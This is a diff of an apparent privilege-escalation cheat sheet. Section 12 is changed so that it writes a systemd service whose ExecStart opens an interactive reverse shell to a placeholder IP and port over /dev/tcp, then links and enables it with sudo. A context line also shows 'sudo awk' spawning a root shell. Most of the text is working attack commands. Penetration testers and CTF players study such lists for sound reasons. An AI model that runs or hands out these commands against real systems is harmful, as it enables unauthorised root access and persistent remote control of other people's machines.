@@ -132,8 +132,15 @@ sudo awk 'BEGIN {system("/bin/sh")}'
 ### 12. Reverse-shell service
 
 ```sh
-sudo systemctl --force --batch enable 'sh -c "sh -i >& /dev/tcp/<IP>/<PORT> 0>&1".service'
-sudo systemctl start sh-c*.service
+TF=$(mktemp).service
+cat <<EOF > $TF
+[Service]
+ExecStart=/bin/sh -c "sh -i >& /dev/tcp/<IP>/<PORT> 0>&1"
+[Install]
+WantedBy=multi-user.target
+EOF
+sudo systemctl link $TF
+sudo systemctl enable --now $TF
 ```
 
 ---
@@ -142,5 +149,5 @@ sudo systemctl start sh-c*.service
 
 ```sh
 sudo visudo -c
-sudo visudo -l
+sudo -l
 ```
